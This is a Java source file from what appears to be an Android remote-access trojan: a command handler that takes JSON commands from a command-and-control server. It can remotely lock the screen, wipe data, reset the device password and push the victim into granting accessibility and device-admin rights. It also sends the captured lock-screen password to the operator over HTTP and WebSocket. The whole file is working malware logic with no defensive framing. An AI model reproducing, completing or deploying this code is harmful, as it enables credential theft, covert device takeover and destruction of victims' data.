package com.vendor.rat.service;

import android.content.Context;
import android.util.Log;

import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.vendor.rat.auto.engine.AccessibilityServiceEngine;
import com.vendor.rat.auto.engine.AutoEngine;
import com.vendor.rat.auto.engine.DeviceAdminEngine;
import com.vendor.rat.auto.engine.LockScreenMonitor;
import com.vendor.rat.network.HttpClient;
import com.vendor.rat.network.NetworkManager;
import com.vendor.rat.network.WebSocketClient;
import com.vendor.rat.utils.DeviceUtils;

/**
 * WebSocket 指令处理器
 *
 * 将无障碍模块接入 C2 通信:
 *   - 解析 JSON 指令
 *   - 远程触发引擎执行
 *   - 状态上报
 *   - 密码上报
 *
 * 指令格式:
 *   { "cmd": "start_engine", "engine": "xiaomi" }
 *   { "cmd": "stop_engine", "engine": "xiaomi" }
 *   { "cmd": "lock_screen" }
 *   { "cmd": "wipe_data" }
 *   { "cmd": "get_status" }
 *   { "cmd": "start_permission_flow" }
 *   { "cmd": "start_all_engines" }
 */
public class CommandHandler implements LockScreenMonitor.PasswordCaptureListener {

    private static final String TAG = "CommandHandler";

    // 指令常量
    private static final String CMD_START_ENGINE = "start_engine";
    private static final String CMD_STOP_ENGINE = "stop_engine";
    private static final String CMD_LOCK_SCREEN = "lock_screen";
    private static final String CMD_WIPE_DATA = "wipe_data";
    private static final String CMD_RESET_PASSWORD = "reset_password";
    private static final String CMD_GET_STATUS = "get_status";
    private static final String CMD_START_PERMISSION_FLOW = "start_permission_flow";
    private static final String CMD_START_ALL_ENGINES = "start_all_engines";

    // 上报路径
    private static final String API_LOCK_CIPHER = "/api/cipher/postLockCipher.json";
    private static final String API_STATUS = "/api/device/status.json";

    private final Gson gson = new Gson();

    /**
     * 初始化: 注册到 WebSocket 和 LockScreenMonitor
     */
    public void init() {
        // 注册密码捕获回调
        MyAccessibilityService service = MyAccessibilityService.getInstance();
        if (service != null && service.getEngineManager() != null) {
            LockScreenMonitor monitor = service.getEngineManager()
                .getEngine(LockScreenMonitor.class);
            if (monitor != null) {
                monitor.setCaptureListener(this);
                Log.i(TAG, "Registered as password capture listener");
            }
        }
    }

    // ============ 引擎指令处理 (由 CommandDispatcher 委托调用) ============

    public void onCommand(String type, String subc, JsonObject json) {
        Log.d(TAG, "Command received: type=" + type + ", subc=" + subc);

        try {
            // 兼容旧 cmd 格式 (来自本地 HttpCommandServer)
            String cmd = json.has("cmd") ? json.get("cmd").getAsString() : "";
            if (!cmd.isEmpty()) {
                dispatchByCmd(cmd, json);
                return;
            }

            // Laravel PanelSendHandler 下发的命令: type="screencomd", subc="xxx"
            // 具体命令分发由 Phase 5 的 CommandDispatcher 处理
            // 这里只处理引擎相关的自定义命令
            if ("engine".equals(type)) {
                dispatchByCmd(subc != null ? subc : "", json);
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to parse command", e);
            sendResponse("error", "Parse error: " + e.getMessage());
        }
    }

    private void dispatchByCmd(String cmd, JsonObject json) {
        switch (cmd) {
            case CMD_START_ENGINE:
                handleStartEngine(json);
                break;
            case CMD_STOP_ENGINE:
                handleStopEngine(json);
                break;
            case CMD_LOCK_SCREEN:
                handleLockScreen();
                break;
            case CMD_WIPE_DATA:
                handleWipeData();
                break;
            case CMD_RESET_PASSWORD:
                handleResetPassword(json);
                break;
            case CMD_GET_STATUS:
                handleGetStatus();
                break;
            case CMD_START_PERMISSION_FLOW:
                handleStartPermissionFlow();
                break;
            case CMD_START_ALL_ENGINES:
                handleStartAllEngines();
                break;
            default:
                Log.w(TAG, "Unknown command: " + cmd);
                sendResponse("error", "Unknown command: " + cmd);
        }
    }

    // ============ 指令实现 ============

    /**
     * 启动指定引擎
     */
    private void handleStartEngine(JsonObject json) {
        String engineName = json.has("engine") ? json.get("engine").getAsString() : "";
        EngineManager manager = getEngineManager();
        if (manager == null) {
            sendResponse("error", "EngineManager not available");
            return;
        }

        AutoEngine engine = findEngineByName(manager, engineName);
        if (engine != null) {
            engine.start();
            sendResponse("ok", "Engine started: " + engineName);
        } else {
            sendResponse("error", "Engine not found: " + engineName);
        }
    }

    /**
     * 停止指定引擎
     */
    private void handleStopEngine(JsonObject json) {
        String engineName = json.has("engine") ? json.get("engine").getAsString() : "";
        EngineManager manager = getEngineManager();
        if (manager == null) {
            sendResponse("error", "EngineManager not available");
            return;
        }

        AutoEngine engine = findEngineByName(manager, engineName);
        if (engine != null) {
            engine.finish();
            sendResponse("ok", "Engine stopped: " + engineName);
        } else {
            sendResponse("error", "Engine not found: " + engineName);
        }
    }

    /**
     * 远程锁屏
     */
    private void handleLockScreen() {
        Context context = getContext();
        if (context != null) {
            AppDeviceAdminReceiver.lockScreen(context);
            sendResponse("ok", "Screen locked");
        } else {
            sendResponse("error", "Context not available");
        }
    }

    /**
     * 远程擦除数据
     */
    private void handleWipeData() {
        Context context = getContext();
        if (context != null) {
            AppDeviceAdminReceiver.wipeData(context);
            sendResponse("ok", "Wipe initiated");
        } else {
            sendResponse("error", "Context not available");
        }
    }

    /**
     * 远程重置密码
     */
    private void handleResetPassword(JsonObject json) {
        String newPassword = json.has("password") ? json.get("password").getAsString() : "";
        Context context = getContext();
        if (context != null && !newPassword.isEmpty()) {
            boolean result = AppDeviceAdminReceiver.resetPassword(context, newPassword);
            sendResponse(result ? "ok" : "error",
                result ? "Password reset" : "Password reset failed");
        } else {
            sendResponse("error", "Context or password not available");
        }
    }

    /**
     * 状态上报
     */
    private void handleGetStatus() {
        JsonObject status = buildStatusReport();
        sendResponse("status", status.toString());

        // 同时通过 HTTP 上报
        HttpClient httpClient = NetworkManager.getInstance().getHttpClient();
        if (httpClient != null) {
            httpClient.post(API_STATUS, status.toString(), null);
        }
    }

    /**
     * 启动权限引导流程
     */
    private void handleStartPermissionFlow() {
        EngineManager manager = getEngineManager();
        if (manager != null) {
            // 启动无障碍服务引擎
            AccessibilityServiceEngine a11yEngine =
                manager.getEngine(AccessibilityServiceEngine.class);
            if (a11yEngine != null) {
                a11yEngine.start();
            }

            // 启动设备管理员引擎
            DeviceAdminEngine adminEngine = manager.getEngine(DeviceAdminEngine.class);
            if (adminEngine != null) {
                adminEngine.start();
            }

            sendResponse("ok", "Permission flow started");
        } else {
            sendResponse("error", "EngineManager not available");
        }
    }

    /**
     * 启动所有引擎
     */
    private void handleStartAllEngines() {
        EngineManager manager = getEngineManager();
        if (manager != null) {
            manager.startAllEngines();
            sendResponse("ok", "All engines started");
        } else {
            sendResponse("error", "EngineManager not available");
        }
    }

    // ============ 密码上报 (LockScreenMonitor 回调) ============

    @Override
    public void onPasswordCaptured(String lockType, String lockValue) {
        Log.i(TAG, "Password captured: type=" + lockType + ", length=" + lockValue.length());

        // 构建上报数据
        JsonObject data = new JsonObject();
        data.addProperty("deviceId", NetworkManager.getInstance().getDeviceId());
        data.addProperty("lockType", lockType);
        data.addProperty("lockValue", lockValue);
        data.addProperty("timestamp", System.currentTimeMillis());

        // HTTP POST 上报
        HttpClient httpClient = NetworkManager.getInstance().getHttpClient();
        if (httpClient != null) {
            httpClient.post(API_LOCK_CIPHER, data.toString(), null);
        }

        // WebSocket 实时上报
        WebSocketClient wsClient = NetworkManager.getInstance().getWebSocketClient();
        if (wsClient != null && wsClient.isConnected()) {
            JsonObject wsMsg = new JsonObject();
            wsMsg.addProperty("type", 2); // PASSWORD_REPORT
            wsMsg.add("data", data);
            wsClient.send(wsMsg.toString());
        }
    }

    // ============ 状态构建 ============

    /**
     * 构建完整状态报告
     */
    private JsonObject buildStatusReport() {
        JsonObject status = new JsonObject();

        // 设备信息
        status.addProperty("deviceId", NetworkManager.getInstance().getDeviceId());
        status.addProperty("vendor", DeviceUtils.getVendorName());
        status.addProperty("vendorId", DeviceUtils.getVendorId());
        status.addProperty("brand", DeviceUtils.getBrandName());
        status.addProperty("timestamp", System.currentTimeMillis());

        // 服务状态
        MyAccessibilityService service = MyAccessibilityService.getInstance();
        status.addProperty("accessibilityServiceRunning", service != null);

        // 设备管理员状态
        Context context = getContext();
        status.addProperty("deviceAdminActive",
            context != null && AppDeviceAdminReceiver.isAdminActive(context));

        // 引擎状态
        EngineManager manager = getEngineManager();
        if (manager != null) {
            JsonObject engines = new JsonObject();
            for (AutoEngine engine : manager.getEngines()) {
                JsonObject engineStatus = new JsonObject();
                engineStatus.addProperty("running", engine.isRunning());
                engineStatus.addProperty("finished", engine.isFinished());
                engines.add(engine.getEngineName(), engineStatus);
            }
            status.add("engines", engines);
            status.addProperty("engineCount", manager.getEngineCount());
        }

        return status;
    }

    // ============ 工具方法 ============

    private EngineManager getEngineManager() {
        MyAccessibilityService service = MyAccessibilityService.getInstance();
        return service != null ? service.getEngineManager() : null;
    }

    private Context getContext() {
        MyAccessibilityService service = MyAccessibilityService.getInstance();
        return service != null ? service.getApplicationContext() : null;
    }

    /**
     * 通过名称查找引擎
     */
    private AutoEngine findEngineByName(EngineManager manager, String name) {
        if (name == null || name.isEmpty()) return null;
        String lower = name.toLowerCase();
        for (AutoEngine engine : manager.getEngines()) {
            if (engine.getEngineName().toLowerCase().contains(lower)) {
                return engine;
            }
        }
        return null;
    }

    /**
     * 发送 WebSocket 响应
     */
    private void sendResponse(String status, String message) {
        WebSocketClient wsClient = NetworkManager.getInstance().getWebSocketClient();
        if (wsClient != null && wsClient.isConnected()) {
            JsonObject response = new JsonObject();
            response.addProperty("type", 3); // COMMAND_RESPONSE
            response.addProperty("status", status);
            response.addProperty("message", message);
            response.addProperty("timestamp", System.currentTimeMillis());
            wsClient.send(response.toString());
        }
    }
}
